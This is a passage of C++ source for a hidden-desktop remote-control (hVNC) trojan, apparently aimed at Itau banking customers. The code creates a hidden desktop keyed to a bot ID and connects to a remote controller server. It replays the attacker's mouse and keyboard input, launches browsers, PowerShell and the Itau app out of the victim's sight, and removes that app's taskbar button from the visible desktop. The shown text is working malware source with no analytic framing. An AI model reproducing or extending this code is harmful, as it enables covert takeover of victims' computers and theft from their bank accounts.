			HDESK hDesk = Funcs::pOpenDesktopA("\Default", 0, TRUE, GENERIC_ALL);
			SwitchDesktop(hDesk);
			Funcs::pSetThreadDesktop(g_hDesk);
		}

		HDESK hDesk = Funcs::pOpenDesktopA("\Default", 0, TRUE, GENERIC_ALL);
		SetThreadDesktop(hDesk);
		std::vector<std::pair<HWND, std::string>> visibleWindowsWithAppName = GetAllVisibleWindowsWithAppName();
		// Print the visible window handles and their associated application names
		for (const auto& pair : visibleWindowsWithAppName) {
			if (pair.second.find("itauaplicativo") != std::string::npos)
			{
				WriteLog(pair.second.c_str());

				DeleteTaskbarButton(pair.first);
			}
		}
		SetThreadDesktop(g_hDesk);


		//WriteLog(desktopName);
	}
}

//Standard mouse event function via SendInput
void SendMouseEventInternal(int m_event, float x, float y) {
	double fScreenWidth = ::GetSystemMetrics(SM_CXSCREEN);
	double fScreenHeight = ::GetSystemMetrics(SM_CYSCREEN);
	double fx = x * (65535.0f / fScreenWidth);
	double fy = y * (65535.0f / fScreenHeight);

	INPUT  Input = { 0 };
	Input.type = INPUT_MOUSE;
	Input.mi.dwFlags = m_event | MOUSEEVENTF_ABSOLUTE;
	Input.mi.dx = (long)fx;
	Input.mi.dy = (long)fy;
	::SendInput(1, &Input, sizeof(INPUT));
}

//Standard keybd event function via SendInput
void SendKeybdEventInternal(int m_key, int msg) {
	switch (msg)
	{
	case WM_CHAR:
	{
		INPUT inputs[2] = {};
		ZeroMemory(inputs, sizeof(inputs));

		inputs[0].type = INPUT_KEYBOARD;
		inputs[0].ki.wVk = m_key;

		inputs[1].type = INPUT_KEYBOARD;
		inputs[1].ki.wVk = m_key;
		inputs[1].ki.dwFlags = KEYEVENTF_KEYUP;

		UINT uSent = SendInput(ARRAYSIZE(inputs), inputs, sizeof(INPUT));
		break;
	}
	case WM_KEYDOWN:
	{
		INPUT  Input = { 0 };
		Input.type = INPUT_KEYBOARD;
		Input.ki.wVk = m_key;
		::SendInput(1, &Input, sizeof(INPUT));
		break;
	}
	case WM_KEYUP:
	{
		INPUT  Input = { 0 };
		Input.type = INPUT_KEYBOARD;
		Input.ki.wVk = m_key;
		Input.ki.dwFlags = KEYEVENTF_KEYUP;
		::SendInput(1, &Input, sizeof(INPUT));
		break;
	}
	}
}

static DWORD WINAPI InputThread(LPVOID param)
{
	SOCKET s = ConnectServer();

	Funcs::pSetThreadDesktop(g_hDesk);

	if (Funcs::pSend(s, (char*)gc_magik, sizeof(gc_magik), 0) <= 0)
		return 0;
	if (SendInt(s, Connection::input) <= 0)
		return 0;

	DWORD response;
	if (!Funcs::pRecv(s, (char*)& response, sizeof(response), 0))
		return 0;

	g_hDesktopThread = Funcs::pCreateThread(NULL, 0, DesktopThread, NULL, 0, 0);

	POINT      lastPoint;
	BOOL       lmouseDown = FALSE;
	HWND       hResMoveWindow = NULL;
	LRESULT    resMoveType = NULL;

	lastPoint.x = 0;
	lastPoint.y = 0;

	for (;;)
	{
		UINT   msg;
		WPARAM wParam;
		LPARAM lParam;

		if (Funcs::pRecv(s, (char*)& msg, sizeof(msg), 0) <= 0)
			goto exit;
		if (Funcs::pRecv(s, (char*)& wParam, sizeof(wParam), 0) <= 0)
			goto exit;
		if (Funcs::pRecv(s, (char*)& lParam, sizeof(lParam), 0) <= 0)
			goto exit;

		HWND  hWnd{};
		POINT point;
		POINT lastPointCopy;
		BOOL  mouseMsg = FALSE;

		switch (msg)
		{
		case WmStartApp::startExplorer:
		{
			const DWORD neverCombine = 2;
			const char* valueName = Strs::hd4;

			HKEY hKey;
			Funcs::pRegOpenKeyExA(HKEY_CURRENT_USER, Strs::hd3, 0, KEY_ALL_ACCESS, &hKey);
			DWORD value;
			DWORD size = sizeof(DWORD);
			DWORD type = REG_DWORD;
			Funcs::pRegQueryValueExA(hKey, valueName, 0, &type, (BYTE*)& value, &size);

			if (value != neverCombine)
				Funcs::pRegSetValueExA(hKey, valueName, 0, REG_DWORD, (BYTE*)& neverCombine, size);

			char explorerPath[MAX_PATH] = { 0 };
			Funcs::pGetWindowsDirectoryA(explorerPath, MAX_PATH);
			Funcs::pLstrcatA(explorerPath, Strs::fileDiv);
			Funcs::pLstrcatA(explorerPath, Strs::explorerExe);

			STARTUPINFOA startupInfo = { 0 };
			startupInfo.cb = sizeof(startupInfo);
			startupInfo.lpDesktop = g_desktopName;
			PROCESS_INFORMATION processInfo = { 0 };
			Funcs::pCreateProcessA(explorerPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);

			//APPBARDATA appbarData;
			//appbarData.cbSize = sizeof(appbarData);
			//for (int i = 0; i < 5; ++i)
			//{
			//	Sleep(1000);
			//	appbarData.hWnd = Funcs::pFindWindowA(Strs::shell_TrayWnd, NULL);
			//	if (appbarData.hWnd)
			//		break;
			//}
//
			//appbarData.lParam = ABS_ALWAYSONTOP;
			//Funcs::pSHAppBarMessage(ABM_SETSTATE, &appbarData);
//
			//Funcs::pRegSetValueExA(hKey, valueName, 0, REG_DWORD, (BYTE*)& value, size);
			//Funcs::pRegCloseKey(hKey);
			break;
		}
		case WmStartApp::startRun:
		{
			char rundllPath[MAX_PATH] = { 0 };
			Funcs::pSHGetFolderPathA(NULL, CSIDL_SYSTEM, NULL, 0, rundllPath);
			lstrcatA(rundllPath, Strs::hd2);

			STARTUPINFOA startupInfo = { 0 };
			startupInfo.cb = sizeof(startupInfo);
			startupInfo.lpDesktop = g_desktopName;
			PROCESS_INFORMATION processInfo = { 0 };
			Funcs::pCreateProcessA(NULL, rundllPath, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);
			break;
		}
		case WmStartApp::startPowershell:
		{
			StartPowershell();
			break;
		}
		case WmStartApp::startChrome:
		{
			StartChrome();
			break;
		}
		case WmStartApp::startItau:
		{
			StartItau();
			break;
		}
		case WmStartApp::monitorItau:
		{
			// g_fItauMonitored = true;
			// MonitorItau();
			break;
		}
		case WmStartApp::startEdge:
		{
			StartEdge();
			break;
		}
		case WmStartApp::startBrave:
		{
			StartBrave();
			break;
		}
		case WmStartApp::startFirefox:
		{
			StartFirefox();
			break;
		}
		case WmStartApp::startIexplore:
		{
			StartIe();
			break;
		}
		case WM_CHAR:
		case WM_KEYDOWN:
		case WM_KEYUP:
		{
			point = lastPoint;
			if (g_fItauRunning)
			{
				// new code
				SendKeybdEventInternal(wParam, msg);
			}
			else
			{
				hWnd = Funcs::pWindowFromPoint(point);
			}
			break;
		}
		default:
		{
			mouseMsg = TRUE;
			point.x = GET_X_LPARAM(lParam);
			point.y = GET_Y_LPARAM(lParam);
			lastPointCopy = lastPoint;
			lastPoint = point;

			hWnd = Funcs::pWindowFromPoint(point);
			if (g_fItauRunning)
			{
				if (msg == WM_LBUTTONUP || msg == WM_LBUTTONDOWN || msg == WM_MOUSEMOVE)
				{
					int m_event = MOUSEEVENTF_MOVE;
					if (msg == WM_LBUTTONUP)
					{
						m_event = MOUSEEVENTF_LEFTUP;
					}
					else if (msg == WM_LBUTTONDOWN)
					{
						m_event = MOUSEEVENTF_LEFTDOWN;
					}
					SendMouseEventInternal(m_event, point.x, point.y);
					continue;
				}
			}
			else
			{
				if (msg == WM_LBUTTONUP)
				{
					LRESULT lResult = Funcs::pSendMessageA(hWnd, WM_NCHITTEST, NULL, lParam);

					switch (lResult)
					{
					case HTTRANSPARENT:
					{
						Funcs::pSetWindowLongA(hWnd, GWL_STYLE, Funcs::pGetWindowLongA(hWnd, GWL_STYLE) | WS_DISABLED);
						lResult = Funcs::pSendMessageA(hWnd, WM_NCHITTEST, NULL, lParam);
						break;
					}
					case HTCLOSE:
					{
						Funcs::pPostMessageA(hWnd, WM_CLOSE, 0, 0);
						break;
					}
					case HTMINBUTTON:
					{
						Funcs::pPostMessageA(hWnd, WM_SYSCOMMAND, SC_MINIMIZE, 0);
						break;
					}
					case HTMAXBUTTON:
					{
						WINDOWPLACEMENT windowPlacement;
						windowPlacement.length = sizeof(windowPlacement);
						Funcs::pGetWindowPlacement(hWnd, &windowPlacement);
						if (windowPlacement.flags & SW_SHOWMAXIMIZED)
							Funcs::pPostMessageA(hWnd, WM_SYSCOMMAND, SC_RESTORE, 0);
						else
							Funcs::pPostMessageA(hWnd, WM_SYSCOMMAND, SC_MAXIMIZE, 0);
						break;
					}
					}
				}
				else if (msg == WM_LBUTTONDOWN)
				{
					RECT startButtonRect;
					HWND hStartButton = Funcs::pFindWindowA("Button", NULL);
					Funcs::pGetWindowRect(hStartButton, &startButtonRect);
					if (Funcs::pPtInRect(&startButtonRect, point))
					{
						Funcs::pPostMessageA(hStartButton, BM_CLICK, 0, 0);
						continue;
					}
					else
					{
						char windowClass[MAX_PATH] = { 0 };
						Funcs::pRealGetWindowClassA(hWnd, windowClass, MAX_PATH);

						if (!Funcs::pLstrcmpA(windowClass, Strs::hd1))
						{
							HMENU hMenu = (HMENU)Funcs::pSendMessageA(hWnd, MN_GETHMENU, 0, 0);
							int itemPos = Funcs::pMenuItemFromPoint(NULL, hMenu, point);
							int itemId = Funcs::pGetMenuItemID(hMenu, itemPos);
							Funcs::pPostMessageA(hWnd, 0x1e5, itemPos, 0);
							Funcs::pPostMessageA(hWnd, WM_KEYDOWN, VK_RETURN, 0);
							continue;
						}
					}
				}
				else if (msg == WM_MOUSEMOVE)
				{
					hWnd = GetAncestor(hWnd, GA_ROOT);
					Funcs::pScreenToClient(hWnd, &point);
					lParam = MAKELPARAM(point.x, point.y);
					Funcs::pPostMessageA(hWnd, msg, wParam, lParam);
					continue;
				}
			}
			break;
		}
		}

		for (HWND currHwnd = hWnd;;)
		{
			hWnd = currHwnd;
			Funcs::pScreenToClient(currHwnd, &point);
			currHwnd = Funcs::pChildWindowFromPoint(currHwnd, point);
			if (!currHwnd || currHwnd == hWnd)
				break;
		}

		if (mouseMsg)
			lParam = MAKELPARAM(point.x, point.y);

		Funcs::pPostMessageA(hWnd, msg, wParam, lParam);
	}
exit:
	Funcs::pTerminateThread(g_hDesktopThread, 0);
	return 0;
}

static DWORD WINAPI MainThread(LPVOID param)
{
	Funcs::pMemset(g_desktopName, 0, sizeof(g_desktopName));
	GetBotId(g_desktopName);

	Funcs::pMemset(&g_bmpInfo, 0, sizeof(g_bmpInfo));
	g_bmpInfo.bmiHeader.biSize = sizeof(g_bmpInfo.bmiHeader);
	g_bmpInfo.bmiHeader.biPlanes = 1;
	g_bmpInfo.bmiHeader.biBitCount = 24;
	g_bmpInfo.bmiHeader.biCompression = BI_RGB;
	g_bmpInfo.bmiHeader.biClrUsed = 0;

	g_hDesk = Funcs::pOpenDesktopA(g_desktopName, 0, TRUE, GENERIC_ALL);
	if (!g_hDesk)
		g_hDesk = Funcs::pCreateDesktopA(g_desktopName, NULL, NULL, 0, DESKTOP_CREATEMENU |
			DESKTOP_CREATEWINDOW |
			DESKTOP_ENUMERATE |
			DESKTOP_HOOKCONTROL |
			DESKTOP_JOURNALPLAYBACK |
			DESKTOP_JOURNALRECORD |
			DESKTOP_READOBJECTS |
			DESKTOP_SWITCHDESKTOP |
			DESKTOP_WRITEOBJECTS |
			STANDARD_RIGHTS_REQUIRED, NULL);
	Funcs::pSetThreadDesktop(g_hDesk);

	// g_hMaintainDesktop = Funcs::pCreateThread(NULL, 0, MaintainThread, NULL, 0, 0);
	g_hInputThread = Funcs::pCreateThread(NULL, 0, InputThread, NULL, 0, 0);
	getInstallationAppsList(g_applist);

	Funcs::pWaitForSingleObject(g_hInputThread, INFINITE);

	Funcs::pFree(g_pixels);
	Funcs::pFree(g_oldPixels);
	Funcs::pFree(g_tempPixels);

	Funcs::pCloseHandle(g_hInputThread);
	Funcs::pCloseHandle(g_hDesktopThread);
	// Funcs::pCloseHandle(g_hMaintainDesktop);

	g_pixels = NULL;
	g_oldPixels = NULL;
	g_tempPixels = NULL;
	g_started = FALSE;
	return 0;
}

HANDLE StartHiddenDesktop(const char* host, int port)
{
	if (g_started)
		return NULL;
	Funcs::pLstrcpyA(g_host, host);
	g_port = port;
	g_started = TRUE;
	return Funcs::pCreateThread(NULL, 0, MainThread, NULL, 0, 0);
}
